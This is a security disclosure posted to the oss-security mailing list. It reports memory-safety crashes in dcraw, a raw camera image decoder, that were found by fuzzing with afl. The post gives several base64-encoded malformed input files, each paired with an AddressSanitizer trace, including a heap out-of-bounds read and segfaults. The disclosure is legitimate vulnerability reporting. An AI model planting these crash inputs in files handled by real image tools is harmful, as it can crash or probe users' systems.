  oss-security - Crashes and memory safety bugs in dcraw            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Fri, 23 Nov From: Hanno Bรถck <hanno@...eck.de> To: oss-security@...ts.openwall.com Subject: Crashes and memory safety bugs in dcraw  Hi,  dcraw is a tool to process raw images from digital cameras. It easily crashes with various issues (tested version This was very shallow testing (afl fuzzing with random inputs, not starting with valid images), I assume there's much more. I reported those a long time ago to its author, he didn't seem interested in fixing such issues.  Some applications use dcraw automatically to parse images (gthumb, kphotoalbum, kde thumbnailers, gwenview).  Input samples are base64.   Segfault / memory read on invalid address in crop_masked_pixels ---------------------------------------------------------------  TU0wMIEwMDAAMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMIX/MDAwMDAw MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMLTCMDAw MDAwAAAAMDAwMDAwMDAwMDAwMMaN  AddressSanitizer: SEGV on unknown address (pc bp sp T0) signal is caused by a READ memory access.     #0 in crop_masked_pixels     #1 in main     #2 in __libc_start_main     #3 in _start   Heap out of bounds read in parse_tiff_ifd -----------------------------------------  TU0wMIAwMDAAMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMMUWMDAAAAA=   AddressSanitizer: heap-buffer-overflow on address at pc bp sp READ of size at thread T0     #0 in __interceptor_index     #1 in parse_tiff_ifd     #2 in parse_tiff     #3 in identify     #4 in main     #5 in __libc_start_main     #6 in _start  is located 0 bytes to the right of region allocated by thread T0 here:     #0 in malloc     #1 in parse_tiff_ifd     #2 in parse_tiff     #3 in identify     #4 in main     #5 in __libc_start_main   Invalid memory read in crop_masked_pixels -----------------------------------------  TU0wMIEwMDAAMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMIX/MDAwMDAw MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMLTCMDAw MDAwAAAAMDAwMDAwMDAwMDAwMMaN  AddressSanitizer: SEGV on unknown address (pc bp sp T0) signal is caused by a READ memory access.     #0 in crop_masked_pixels     #1 in main     #2 in __libc_start_main     #3 in _start   floating point exception / segfault in parse_tiff_ifd -----------------------------------------------------  TU0wMIAwMDAAMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMP0JMDAAAAAA  AddressSanitizer: FPE on unknown address (pc bp sp T0)     #0 in parse_tiff_ifd     #1 in parse_tiff     #2 in identify     #3 in main     #4 in __libc_start_main     #5 in _start   floating point exception in kodac_radc_load_raw -----------------------------------------------  UFhOAA==  AddressSanitizer: FPE on unknown address (pc bp sp T0)     #0 in kodak_radc_load_raw     #1 in main     #2 in __libc_start_main     #3 in _start    --  Hanno Bรถck https://hboeck.de/  mail/jabber: hanno@...eck.de GPG:  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      